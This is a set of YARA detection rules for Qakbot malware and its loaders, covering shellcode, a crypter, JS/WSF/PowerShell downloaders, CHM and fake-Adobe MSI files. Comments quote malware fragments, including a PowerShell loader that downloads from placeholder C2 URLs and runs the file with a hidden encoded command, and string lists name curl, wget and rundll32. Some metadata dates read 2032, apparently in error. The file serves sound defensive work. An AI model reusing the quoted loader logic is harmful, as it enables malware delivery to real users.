import "pe"

rule Classification_Qakbot: T1055
{
    meta:
        tlp = "green"
        author = "Jeremy Humble"
        date = "2021-10-22"
        description = "Qakbot"
        references = ""
        hashes = "98140e5672de3f7c9239b112d0a2bf63
        scope = "detection"
        platform = "ICET,FDR"
        fdr_scope = "shellcode"
    
    strings:
        /*
            0x1001E688 is prepopulated before injection to contain win api function pointers and other info needed to execute
            10005CCD | 55                       | push ebp                                                                                 |
            10005CCE | 8BEC                     | mov ebp,esp                                                                              |
            10005CD0 | A1 88E60110              | mov eax,dword ptr ds:[1001E688]                                                          |
            10005CD5 | 83EC 28                  | sub esp,28                                                                               |
            10005CD8 | 56                       | push esi                                                                                 |
            10005CD9 | FFB0 24020000            | push dword ptr ds:[eax+224]                                                              |
        */
        $inject_entry = { 55 8B EC [0-16] FF B0 24 02 00 00 }


        // https://opensource.apple.com/source/CPANInternal/CPANInternal-32/libwww-perl/lib/HTTP/Cookies/Microsoft.pm - epoch_time_offset_from_win32_filetime
        $wintime_to_unix_time_le_1 = {00 80 3E D5 [0-32] DE B1 9D 01}
        $wintime_to_unix_time_le_2 = {DE B1 9D 01 [0-32] 00 80 E3 D5}
        $wintime_to_unix_time_be_1 = {D5 3E 80 00 [0-32] 01 9D B1 DE}
        $wintime_to_unix_time_be_2 = {01 9D B1 DE [0-32] D5 E3 80 00}

        $mersenne_be = {6C 07 89 65}
        $mersenne_le = {65 89 07 6C}
        /*
            1000CB2B | 68 60EA0000              | push EA60                                                           |
            1000CB30 | 57                       | push edi                                                            |
            1000CB31 | FF50 2C                  | call dword ptr ds:[eax+2C]                                          | WaitForSingleObject
        */
        $wait_60 =  {68 60 ea 00 00 (50|51|52|53|55|56|57)}

        $reg_install_1 = {(01|03) 00 00 80}
        $reg_install_2 = {68 19 00 02 00 } // KEY_EXECUTE (0x20019)

        $sha1_be = {C3 D2 E1 F0}
        $sha1_le = {F0 E1 D2 C3}
        
        $gen_random_string = {
                                6A 0F
                                6A 0A
                                6A (01|02)
                            }

    condition:
        $inject_entry or
        $gen_random_string or
        (
            5 of ($mersenne*, $sha1*, $wait_60, $reg*, $wintime*) and
            pe.DLL and
            pe.number_of_resources >= 2 and
            filesize < 2MB and
            pe.imports("kernel32.dll", "GetProcAddress") and
            pe.imports("kernel32.dll", "LoadLibraryA")
        )
}

rule Classification_FakeCert_WSF: T1027_009
{
    meta:
        tlp = "green"
        author = "Jeremy Humble"
        date = "2023-03-06"
        description = "FakeCert Downloader used by UNC2500 and UNC2633 to deliver Qakbot in Feb 2023"
        references = "https://advantage.mandiant.com/reports/23-00002137"
        hashes = "18eb7ec1993f9cc49c13e5bdd02e8699"
        scope = "detection"
        platform = "ICET,FDR"
    
    strings:
        $mal_fakecert = /[a-zA-Z0-9+\/]{24,}=*<job/ nocase
        $cert = /---BEGIN CERTIFICATE---/
        $wsf0 = /<job\s+id\s*=/ nocase
        $wsf1 = /<\/script><\/job/ nocase
        

    condition:
        any of ($mal*) or
        (
            $cert and
            any of ($wsf*)
        )
        
}

rule Classification_Qakbot_Crypter: T1027_002
{
    meta:
        tlp = "green"
        author = "Jeremy Humble"
        date = "2022-03-02"
        description = "Some Crypter I don't have a name for observed being used to crypt qakbot"
        hashes = "d4b6a981216ed1aa8f62a2b2249e3674"
        scope = "detection"
        platform = "ICET,FDR"
        fdr_scope = "shellcode"
    
    strings:
        /*
        7323C318 | D3F8                     | sar eax,cl                                        |
        7323C31A | 3BD0                     | cmp edx,eax                                       | 
        7323C31C | 7D 09                    | jge 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af |

        7324A802 | D3FA                     | sar edx,cl                                        | 
        7324A804 | 3BC2                     | cmp eax,edx                                       | 
        7324A806 | 7C 0A                    | jl 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af2 |

        7324AAE0 | D3FA                     | sar edx,cl                                        | 
        7324AAE2 | 3BC2                     | cmp eax,edx                                       | 
        7324AAE4 | 7E 09                    | jle 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af |

        7324ABAE | D3FA                     | sar edx,cl                                        | 
        7324ABB0 | 3BC2                     | cmp eax,edx                                       | 
        7324ABB2 | 7C 0D                    | jl 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af2 |

        7324B026 | D3F8                     | sar eax,cl                                        |
        7324B028 | 3BD0                     | cmp edx,eax                                       | 
        7324B02A | 75 15                    | jne 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af |

        7324B310 | D3F8                     | sar eax,cl                                        |
        7324B312 | 3BD0                     | cmp edx,eax                                       | 
        7324B314 | 7F 0E                    | jg 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af2 |

        7324B6BE | D3F8                     | sar eax,cl                                        |
        7324B6C0 | 3BD0                     | cmp edx,eax                                       | 
        7324B6C2 | 7F 1A                    | jg 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af2 |
        */  
        $junk_jmp_sar_00 = {D3 F8 3B (C2|D0) 7? (0?|1?)}
        $junk_jmp_sar_01 = {D3 FA 3B (C2|D0) 7? (0?|1?)}
        /*
        7324AD73 | D3E2                     | shl edx,cl                                        | 
        7324AD75 | 3BC2                     | cmp eax,edx                                       | 
        7324AD77 | 7C 0F                    | jl 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af2 |

        7324B101 | D3E0                     | shl eax,cl                                        |
        7324B103 | 3BD0                     | cmp edx,eax                                       | 
        7324B105 | 7C 13                    | jl 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af2 |

        7324B5DF | D3E0                     | shl eax,cl                                        |
        7324B5E1 | 3BD0                     | cmp edx,eax                                       | 
        7324B5E3 | 75 07                    | jne 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af |

        7324B7B8 | D3E2                     | shl edx,cl                                        | 
        7324B7BA | 3BC2                     | cmp eax,edx                                       | 
        7324B7BC | 7E 11                    | jle 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af |

        7324BA7B | D3E0                     | shl eax,cl                                        |
        7324BA7D | 3BD0                     | cmp edx,eax                                       | 
        7324BA7F | 7D 0D                    | jge 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af |


        7324B89E | 3305 EC102073            | xor eax,dword ptr ds:[732010EC]                   |
        7324B8A4 | 3BD0                     | cmp edx,eax                                       | 
        7324B8A6 | 7D 17                    | jge 04d56c81b406dab5008e3c257736aedaa0d39bd01d4af |
        */
        $junk_jmp_shl_00 = { D3 E0 3B (C2|D0) 7? (0?|1?) }
        $junk_jmp_shl_01 = { D3 E2 3B (C2|D0) 7? (0?|1?) }

    condition:
        (#junk_jmp_sar_00 + #junk_jmp_sar_01 + #junk_jmp_shl_00 + #junk_jmp_shl_01) > 5 and
        (#junk_jmp_sar_00 + #junk_jmp_sar_01 + #junk_jmp_shl_00 + #junk_jmp_shl_01) > (filesize\10000)
        
}

rule Classification_Qakbot_HTML_Redirect: Mitre_T1204_001 T1566_002  
{
    meta:
        tlp = "green"
        author = "Jeremy Humble"
        date = "2022-09-28"
        description = "Qakbot"
        hashes = "8424274429dd76ad4ecc88885bb96ae9,c599c4a0c436b5c55acba4cd9196c6cb"
        scope = "detection"
        platform = "ICET"

    strings:
        /* Phishing links go to an html page with the following content: and a redirect to a zip download:
            <span id="DJtK" data-DJtK="/ue/G873885943.zip
            <span id="lAiLyQ" data-lAiLyQ="/eprl/G2180864135.zip
        */
        $high_redirect = /<span id="[a-zA-Z]{3,}" data-[a-zA-Z]{3,}="\/[a-zA-Z]{3,}\/[a-zA-Z0-9_]{4,}\.zip/ 

        $high_decrypt_embedded_zip = /String\.fromCharCode\([a-zA-Z][+-][0-9]{1,3}\)/
             
        $high_var0 = "abc123qqq"
        $high_var1 = "bebe7755qq"
        $high_var2 = "encoded_payload"

        $high_msg0 = "The file is not displayed correctly" nocase
        $high_msg1 = "Use local downloaded file" nocase
        $low_msg2 = ">Document password:" nocase

        $high_obf0 = "&#102;ile" nocase
        $high_obf1 = "f&#105le" nocase
        $high_obf2 = "fi&#108e" nocase
        $high_obf3 = "fil&#101" nocase

        $high_obf4 = "&#80;assword"

        // script is embedded in base64 form inside an svg
        $low_base64_javascript = "<script type=\"text/javascript\">" base64 base64wide
        $high_base64_attachment = "attachment.zip" base64 base64wide
        $high_base64_blob = "b64toBlob" base64 base64wide

    condition:
        any of ($high*) or
        2 of ($low*)
}

rule Classification_Qakbot_ZIP_Containing_JS : T1059_007 qakbot{
    meta:
        tlp = "amber"
        date = "2023-06-21"
        author = "Jeremy Humble"
        Description = "Many recent qakbot campaigns have used a link to a zip containing a js file"
        scope = "detection"
        platform = "icet"

    strings:
        $header = { 50 4b 03 04 }
        $fname_document = /document[_.a-zA-Z0-9 ]{,80}\.js/ nocase
        $fname_short = /[^a-zA-Z0-9_ \/\-.\\][a-zA-Z0-9]{2}\.js/ nocase 

    condition:
    // js files matching known qakbot js patterns
    for any i in (0..#header) : 
    (
        //console.hex("Header at ", @header[i]) and
        $fname_document in (@header[i]+30..@header[i]+30+uint16(@header[i]+26)) or
        $fname_short in (@header[i]+30..@header[i]+30+uint16(@header[i]+26))

    ) // or
    /*
    // I can't get the part to work for some reason :( 
    // ONLY/ALL .js files in zip
    for all i in (0..#header) : 
    (   
        console.hex("Header at ", @header[i]) and
        console.hex("Header length: ", uint16(@header[i]+26)) and
        uint16(@header[i]+26) > 3 and
        uint16(@header[i]+26) < 10000 and
        for any j in (@header[i]+30..(@header[i]+30+uint16(@header[i]+26))):
        (
            uint8(j) == 0x2E and
            (uint8(j+1) == 0x4A or uint8(j+1) == 0x6A) and
            (uint8(j+2) == 0x53 or uint8(j+2) == 0x73)
        )
    )
    // ONLY/ALL .js files in zip
    for all i in (0..#header) : 
    (   
        console.hex("Header at ", @header[i]) and
        console.hex("Header length: ", uint16(@header[i]+26)) and
        uint16(@header[i]+26) > 3 and
        uint16(@header[i]+26) < 10000 and
        for any j in (@header[i]+30..(@header[i]+30+uint16(@header[i]+26))):
        (
            uint8(j) == 0x2E and
            (uint8(j+1) == 0x4A or uint8(j+1) == 0x6A) and
            (uint8(j+2) == 0x53 or uint8(j+2) == 0x73)
        )
    )
    */
}
    


rule Classification_Qakbot_JS_Downloader : T1059_007 qakbot{
    meta:
        tlp = "amber"
        date = "2032-03-06"
        author = "Manny"
        Description = "Detects the obfuscation of the JavaScript code seen downloading Qakbot PS loader."
        scope = "detection"
        platform = "icet"
        references = "fd82aabebd4b206d46ba0d6f3cbdcb9ea620086dba75851c03fd618a3c96b439"
        references = "https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_BB18_06.03.2023.txt"
        references = "85d8a235314c371d4891baeb0d05116854dabda2aa562a93e51aa22914c2487f"
        references = "195b29e6cf73f2cf663b588df69eff43a1e7f27c1dbbd119cf816c99aa556fa1"
    strings:
        /*
        'yGTGD': function (i, j) {
                return i + j;
            },
            'BAKYy': function (i, j) {
                return i + j;
            },
            'DfTyr': function (i, j) {
                return i / j;
            },
            'Qvhwt': function (i, j) {
                return i(j);
            },
            'KznuE': function (i, j) {
                return i + j;
            },
            'nqlRe': function (i, j) {
                return i / j;
            },
        */
        $obf_val_is_def = /('|")[a-zA-Z]{3,10}('|"): function \(( )?[a-zA-Z]( )?,( )?[a-zA-Z]( )?\)/ ascii nocase
        
        
        /*
        var c = {
            'pHwwu': b(0xbd),
            'iCzKs': b(0xbe),
            'Kdadx': b(0xbf),
            'ZPohE': b(0xc0),
            'fOzxl': b(0xc1),
            'seTkP': b(0xc2),
            'MTaNW': b(0xc3),
            'HiBqi': b(0xc4),
            'ZrpwC': b(0xc5),
            'rVTva': b(0xc6),
            'KDIRJ': b(0xc7),
            'XbkNY': b(0xc8),
            'EOrfG': b(0xc9),
            'CJMLE': b(0xca),
        */
        $obf_val_is_call = /('|")[a-zA-Z]{3,10}('|"): [a-zA-Z]\(.{2,10}\),\s/ ascii nocase
        
        
        /*
        f = _0x41a5, g = {
            'FrWzq': function (i, j) {
                return e[b(0x3a7)](i, j);
            },
            'OOdcB': function (i, j) {
                return e[b(0x3a8)](i, j);
            },
            'XSLED': function (i, j) {
                return e[b(0x3a8)](i, j);
            },
            'EHjwC': function (i, j) {
                return e[b(0x3a9)](i, j);
            },
            'wJpPG': function (i) {
                return e[b(0x3aa)](i);
            },
            'mVnGc': function (i, j, k) {
                return e[b(0x3ab)](i, j, k);
            }
        */
        $obf_ret_elem = /return [a-zA-Z]\[[a-zA-Z]\(0x[a-zA-Z0-9]{2,5}\)\]/ ascii nocase
        
        
        /*
            baalite(0x52e, 0x7b6, 0x601, 0x5e6, '0x62e')
            crankumbellicism(0x7ed, 0x7a4, 0x4d2, 'E2IL', '0x6f4')
            spleneticalempestic(0x5d1, 0x620, 0x576, '0x5ef', '0x61b')
            shirtiness(0x483, 0x52d, 0x409, '0x46b', '0x4f2')
            
            There are some variants where the element is actually a string. But there are a plethora of strings that use the actual hex values, so I think this regex string is good.
            (I dont want to account for the hex values stored as strings to avoid costly regex.)
        */
        $obf_dumb_params = /\(0x[a-zA-Z0-9]{1,5},( )?0x[a-zA-Z0-9]{1,5},( )?0x[a-zA-Z0-9]{1,5}/ ascii nocase
        
        $anon_func = "(function"
        
        $obf_true = "!![]"
        
        $func_parseInt = "parseInt"
        $func_decodeURI = "decodeURIComponent"
        $func_fromCharCode = /('|")fromCharCode('|")/
        $func_charCodeAt = /('|")charCodeAt('|")/
        $func_toString = /('|")toString('|")/
        
        $sus_run = /('|")Run('|")/ ascii nocase
        $sus_slice = /('|")Slice('|")/ ascii nocase
        $sus_push = /('|")Push('|")/ ascii nocase
        $sus_split = /('|")Split('|")/ ascii nocase
        $sus_shift = /('|")Shift('|")/ ascii nocase
        
        $keyword_ActiveXObject = "ActiveXObject"
        $keyword_OneDrive = "OneDrive"
        $keyword_setTimeout = "setTimeout"

        $inserted_long_mal_js_line = /\nfunction [^\x0a]{4000,}/ 
        $split_rev_join = /split.{,8}\.reverse.{,8}\.join/

        $low_int_array = / = \[\s?([0-9]{1,4}, ){50,}/ wide ascii
        $low_is_str = /return\(typeof\([a-zA-Z_]{4,50}\) == "string"/ wide ascii
        $low_interleave_arrays = /var [A-Za-z_][A-Za-z_0-9]{2,50}\s{,4}=\s{,4}new\s{1,4}Function\s{,4}\(\s{,4}"[A-Za-z_][A-Za-z_0-9]{2,50}"\s{,4},\s{,4}[A-Za-z_][A-Za-z_0-9]{2,50}/ wide ascii
        $low_msxml = "msxml2.xmlhttp" wide ascii
        $low_WScript = /Wscript\s{,4}\.\s{,4}createobject/ nocase wide ascii
        $low_response = ".responseText" wide ascii
         
    
    condition:
        //@inserted_long_mal_js_line > 10000 or
        (#inserted_long_mal_js_line == 1 and @inserted_long_mal_js_line > 10000) or
        4 of ($low*) or
        $split_rev_join or
        $anon_func and (
            (
                //JS v1
                (3 of ($obf_*)) and (1 of ($keyword_*)) and (1 of ($sus_*))
            ) or (
                //JS v1
                (3 of ($obf_*)) and (4 of ($sus_*))
            ) or (
                //JS v1
                (2 of ($obf_*)) and (2 of ($keyword_*)) and (1 of ($sus_*))
            ) or (
                //JS v2
                (2 of ($obf_*)) and (3 of ($func_*)) and (2 of ($sus_*))
            )
        )
}



rule Classification_Qakbot_Powershell_Downloader: T1059_001
{
    meta:
        tlp = "green"
        author = "Jeremy Humble"
        date = "2023-04-19"
        description = "Qakbot"
        references = ""
        hashes = ""
        scope = "detection"
        platform = "ICET"

    strings:
        /*
            Start-Sleep -Seconds 4;
            $Ionics = ("<c2_url1>,<c2_url2>,<c2_url3>...").split(",");
            foreach ($Deserve in $Ionics) 
            {
                try 
                {   
                    wget $Deserve -TimeoutSec 16 -O $env:TEMP\Porose.upslantHypervitaminosis;
                    if ((Get-Item $env:TEMP\Porose.upslantHypervitaminosis).length -ge 100000) 
                    {   
                        powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -encodedcommand "cwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABQAG8AcgBvAHMAZQAuAHUAcABzAGwAYQBuAHQASAB5AHAAZQByAHYAaQB0AGEAbQBpAG4AbwBzAGkAcwAsAE0AbwB0AGQAOwA=";
                        break;
                    }                                                                                                                                                                                                                                                                                                                                                      
                }   
                catch 
                {   
                    Start-Sleep -Seconds 4;
                }   
            }
        */
        $unencoded_sleep = /Start-Sleep -Seconds [0-9]/ nocase wide ascii
        $unencoded_download = /(curl|wget|Invoke-WebRequest|iwr).{,32}-TimeoutSec\s+[0-9]/ nocase wide ascii
        $unencoded_temp = "$env:TEMP\\" nocase wide ascii
        $unencoded_length_check = /\.length\s{1,16}-ge\s{1,16}100000/ nocase wide ascii
        $unencoded_catch = /catch\s{,16}\{\s{,16}Start-Sleep/ nocase wide ascii
        $unencoded_run0 = "rundll" nocase wide ascii
        $unencoded_run1 = "encodedcommand" nocase wide ascii
        
        $b64_sleep = "Start-Sleep" base64 base64wide
        $b64_encoded_command = "encodedcommand" base64 base64wide
        $b64_foreach = "foreach" base64 base64wide
        $b64_length = "-ge 100000" base64 base64wide
        $b64_temp = "$env:TEMP" base64 base64wide

        // base64wide catches utf16-le encoded base64 strings, but not utf16-le strings that have been base64 encoded. Since BB is doing the latter, we need these ugly checks
        $wide_b64_sleep = "S\x00t\x00a\x00r\x00t\x00-\x00S\x00l\x00e\x00e\x00p\x00" base64 base64wide
        $wide_b64_encoded_command = "e\x00n\x00c\x00o\x00d\x00e\x00d\x00c\x00o\x00m\x00m\x00a\x00n\x00d\x00" base64 base64wide
        $wide_b64_foreach = "f\x00o\x00r\x00e\x00a\x00c\x00h\x00" base64 base64wide
        $wide_b64_length = "-\x00g\x00e\x00 \x001\x000\x000\x000\x000\x000\x00" base64 base64wide
        $wide_b64_temp = "$\x00e\x00n\x00v\x00:\x00T\x00E\x00M\x00P\x00" base64 base64wide
    
        $clsid0 = "adb880a6-d8ff-11cf-9377-00aa003b7a11" nocase wide ascii
        $clsid1 = "52A2AAAE-085D-4187-97EA-8C30DB990436" nocase wide ascii
        $cmd = /value\s{,16}=\s{,16}".{,16}(cmd.exe|powershell.exe)/ nocase wide ascii
        


    condition:
        (
            any of ($clsid*) and
            $cmd
        ) or
        5 of ($unencoded*) or
        2 of ($b64*) or
        2 of ($wide*)
}

rule Classification_Qakbot_CHM : T1218_001 qakbot{
    meta:
        tlp = "amber"
        date = "2032-04-21"
        author = "Manny"
        Description = "Detects the embedded .htm files found in Qakbot .CHM (Compiled HTML File) files."
        scope = "detection"
        platform = "icet"
        references = "781198f63bcc0245d9192f3493c3c2cb1caf06a1b7188138f51ae7aa6ca8afab"
    strings:
        $ActiveX_CLSID = /<OBJECT .{3,500} classid=('|")clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11('|")/ ascii nocase
        $cmd = /<PARAM .{3,500} value=.{1,100}cmd\.exe/
        
        $sus_1 = "-encodedcommand" ascii nocase
        $sus_2 = "powershell" ascii nocase
        $sus_3 = "-ExecutionPolicy" ascii nocase
        $sus_4 = "rundll32" ascii nocase // Precautionary string, we haven't seen Qakbot use this yet in .chm files.
        $sus_5 = "iwr " ascii nocase // Precautionary string, we haven't seen Qakbot use this yet in .chm files.
        $sus_6 = "Invoke-WebRequest" ascii nocase // Precautionary string, we haven't seen Qakbot use this yet in .chm files.
        $sus_7 = /curl(\.exe)? / ascii nocase // Precautionary string, we haven't seen Qakbot use this yet in .chm files.
    condition:
        ($ActiveX_CLSID and $cmd) or (($ActiveX_CLSID or $cmd) and (1 of ($sus_*)))
}

rule Classification_Qakbot_WSF: T1059_007
{
    meta:
        tlp = "amber"
        date = "2032-04-28"
        author = "Jeremy Humble"
        Description = "Detects WSF loader that Qakbot has been using early 2023"
        scope = "detection"
        platform = "icet"
        hashes = "9e37c7701907a6541ca62e9985a974b5"

    strings:
        $sleep0 = /var\s{1,8}[a-zA-Z_][a-zA-Z0-9_]{1,24}\s{,8}=\s{,8}new\s{1,8}Date\s{,8}\(\s{,8}\)/
        $sleep1 = /[^a-zA-Z0-9_][a-zA-Z_][a-zA-Z0-9_]{1,24}\s{,8}=\s{,8}new\s{1,8}Date\s{,8}\(\s{,8}\)/
        $sleep2 = /[^a-zA-Z0-9_][a-zA-Z_][a-zA-Z0-9_]{1,24} - [a-zA-Z_][a-zA-Z0-9_]{1,24} < [a-zA-Z_][a-zA-Z0-9_]{1,24}/

        $cluster0_000 = "\r\n</script>\r\n<script language=\"javascript\">\r\n" ascii // 100.0%"
        $cluster0_001 = "\r\n</script>\r\n<script language=\"vbscript\">\r\n" ascii // 100.0%"
        $cluster0_002 = " -->\r\n<script language=\"javascript\">\r\n" ascii // 100.0%"
        $cluster0_003 = "\r\n</script>\r\n</job>\r\n</package>\r\n" ascii // 100.0%"
        $cluster0_004 = "\r\n<package>\r\n<job id=\"a" ascii // 100.0%"
        $cluster0_005 = ".toUpperCase();\r\nvar au" ascii // 100.0%"
        $cluster0_006 = ".toLowerCase();\r\nvar a" ascii // 100.0%"
        $cluster0_007 = ".toUpperCase();\r\nvar a" ascii // 100.0%"
        $cluster0_008 = " = true;\r\n\r\n\r\n\r\nvar a" ascii // 100.0%"
        $cluster0_009 = ".toLowerCase();\r\n\r\n\r\n" ascii // 100.0%"
        $cluster0_010 = " = new Date();\r\nvar " ascii // 100.0%"
        $cluster0_011 = ".toString();\r\nvar a" ascii // 100.0%"
        $cluster0_012 = ".toString();\r\n\r\n\r\n\r\n" ascii // 100.0%"
        $cluster0_013 = ".toString();\r\nvar a" ascii // 100.0%"
        $cluster0_014 = ".toLowerCase();\r\na" ascii // 100.0%"
        $cluster0_015 = ".toUpperCase();\r\na" ascii // 100.0%"
        $cluster0_016 = ".length;\r\n\r\n\r\n\r\n\r\n" ascii // 100.0%"
        $cluster0_017 = " = false;\r\nvar a" ascii // 100.0%"

        $cluster1_000 = " = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';\r\n                var " ascii // 100.0%"
        $cluster1_001 = "));\r\n                }\r\n                return decodeURIComponent(" ascii // 100.0%"
        $cluster1_002 = "\r\n    while (!![]) {\r\n        try {\r\n            var " ascii // 100.0%"
        $cluster1_003 = "['shift']());\r\n            }\r\n        } catch (" ascii // 100.0%"
        $cluster1_004 = "\">\r\n\t<script language=\"jscript\">\r\n        " ascii // 100.0%"
        $cluster1_005 = "'] === undefined) {\r\n            var " ascii // 100.0%"
        $cluster1_006 = "['shift']());\r\n        }\r\n    }\r\n}(" ascii // 100.0%"
        $cluster1_007 = "'] = !![];\r\n        }\r\n        var " ascii // 100.0%"
        $cluster1_008 = " = function () {\r\n        return " ascii // 100.0%"
        $cluster1_009 = "'] === undefined) {\r\n            " ascii // 100.0%"
        $cluster1_010 = ");\r\n        }\r\n        function " ascii // 100.0%"
        $cluster1_011 = " function () {\r\n        return " ascii // 100.0%"
        $cluster1_012 = " = arguments;\r\n            " ascii // 100.0%"
        $cluster1_013 = " += String['fromCharCode'](" ascii // 100.0%"
        $cluster1_014 = "ing) {\r\n            return " ascii // 100.0%"
        $cluster1_015 = "ly) {\r\n            return " ascii // 100.0%"
        $cluster1_016 = "': function () {\r\n        " ascii // 100.0%"
        $cluster1_017 = " = {};\r\n        function " ascii // 100.0%"
        $cluster1_018 = ");\r\n    }\r\n    function " ascii // 100.0%"
        $cluster1_019 = "['shift']());\r\n        " ascii // 100.0%"
        $cluster1_020 = " = function () {\r\n};\r\n" ascii // 100.0%"
        
    condition:
        for any i in (0..#sleep1):
        (
            $sleep0 in (@sleep1[i]-120..@sleep1[i]-8) and
            $sleep2 in (@sleep1[i]+8..@sleep1[i]+120)
        ) or
        8 of ($cluster0*) or
        8 of ($cluster1*)

}

rule Classification_Qakbot_JS_AntiAnalysis : T1059_007 {
	meta:
		tlp = "amber"
		date = "2023-06-01"
		author = "John Manny"
		description = "Evidence of anti-analysis techniques found in JavaScript files used to deliver and execute Qakbot."
		scope = "detection"
		platform = "icet"
		file_ext = "js,wsf"
		hashes = "36ce25e4786e42a6991eb0ad55142a1926a89eb7fcf6bb0c1958d75cfe473d70, 5171c1d7a02ced8dc28c3405d2b6a81988cc7657413078eb4bc6ac7d4b601d79, 7eb793c1efab64ad1d6941a96f32bb241f5980f8f4f57f8049c82dbcb609078e"
	strings:
		// If Qakbot javaScript starts reading from other files, just add them to this list by naming the variable $file_ and appending the next number.
		$file_1 = "C:\\\\Windows\\\\diagnostics\\\\index\\\\AudioRecordingDiagnostic.xml" ascii wide nocase
		
		$func_calls = /;(\s)?[a-zA-Z_-]{5,20}\("\s"\);/ ascii wide nocase // I am detecting on the code that calls functions with parameters that are just a space.
		
		$sus_obj = "scripting.filesystemobject" ascii wide nocase
		$sus_wscript = "WScript.CreateObject" ascii wide
		$sus_date = "new Date();" ascii wide // They use the current date and subtrack from it to determine how long to sleep.
		$sus_semicolon = /, ?";" ?,/ ascii wide // I just think its sus that they store a semicolon this way.
	condition:
		((1 of ($file_*)) or ($func_calls)) and (2 of ($sus_*))
}

rule Classification_Qakbot_MSI_FakeAdobe : T1218_007 { 
	meta:
		tlp = "amber"
		date = "2023-06-05"
		author = "John Manny"
		description = "Detects strings found in the MSI used in Qakbot killchains. (These MSIs were \"masquerading\" as legit Adobe software.)"
		scope = "detection"
		platform = "ice, triage"
		hashes = "d764436caf7114d880f982d208bd9514a433772dcac851f27c510d1597e26edd, 83648865d6015e61bf4c45a3aa17b8ce86951bcfc28a70fe36cfc2f597984c4a"
		references = "https://twitter.com/Max_Mal_/status/1664348397942321159?cxt=HHwWjsC9nZiD-pguAAAA"
		references = "https://twitter.com/Cryptolaemus1/status/1664300425829404673?cxt=HHwWgsC-keya5JguAAAA"
	strings:
		$error_msg_1 = "Adobe Acrobat PDF Browser Plugin installation error" ascii wide nocase
		
		$file_cab = ".cab" ascii wide nocase // I am aware that most MSI files have CAB files. 
		$file_vbs = ".vbs" ascii wide nocase
		$file_wsf = ".wsf" ascii wide nocase
		
		// I am not doing a $file_dll as its common for MSI's to contain DLLs.
		$fake_adobe_1 = "Adobe Acrobat PDF Browser Plugin 4.8.25" ascii wide nocase

		
	condition:
		((uint32(0) == 0xD0CF11E0) and (2 of ($file_*)) and (1 of ($fake_adobe_*))) or
		(1 of ($error_msg_*))
		
		//if the first set of conditions keep causing FPs, you can just comment out the first line and the $error_msg_* condition will remain valid.
}
